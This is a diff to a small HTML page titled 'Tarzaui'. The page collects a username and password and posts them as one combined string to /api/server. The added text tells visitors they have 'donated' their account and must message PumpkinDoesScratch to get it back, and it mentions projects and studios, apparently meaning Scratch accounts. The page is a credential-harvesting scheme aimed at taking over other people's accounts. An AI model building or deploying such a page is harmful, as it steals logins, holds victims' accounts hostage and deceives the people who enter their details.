@@ -2,39 +2,44 @@
 <html>
     <head>
         <title>Tarzaui</title>
+        <style>
+            * {
+                font-family: monospace;
+            }
+        </style>
     </head>
     <body>
-        <form id="msg-form">
-  <input type="text" id="username" placeholder="Username" />
-  <input type="text" id="password" placeholder="Password" />
-  <button type="submit">Send</button>
-</form>
-
-<script>
-  const form = document.getElementById('msg-form');
-
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const username = document.getElementById('username').value.trim();
-    const password = document.getElementById('password').value.trim();
-    if (!username || !password) {
-      alert('Please enter password AND username.');
-      return;
-    }
-
-    try {
-      const res = await fetch('/api/server', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: `${username}, ${password}` })
-      });
-      document.getElementById('username').value = '';
-      document.getElementById('password').value = '';
-    } catch (err) {
-      console.error('Error:', err);
-    }
-  });
-</script>
-
+        <form id="form">
+            <input type="text" id="username" placeholder="Username" />
+            <input type="text" id="password" placeholder="Password" />
+            <button type="submit">Send</button>
+        </form>
+        <p style="color: red; font-family: monospace;">It is greatly appreciated that you donated your account. If you want your account back please message PumpkinDoesScratch. <br><br>* Your projects, studios, and profile information will not be tampered with.</p>
+        <script>
+            const form = document.getElementById('form');
+            
+            form.addEventListener('submit', async (e) => {
+              e.preventDefault();
+              const username = document.getElementById('username').value.trim();
+              const password = document.getElementById('password').value.trim();
+              if (!username || !password) {
+                alert('Please enter password AND username.');
+                return;
+              }
+            
+              try {
+                const res = await fetch('/api/server', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ content: `${username}, ${password}` })
+                });
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+              } catch (err) {
+                console.error('Error:', err);
+              }
+            });
+        </script>
     </body>
+    a
 </html>
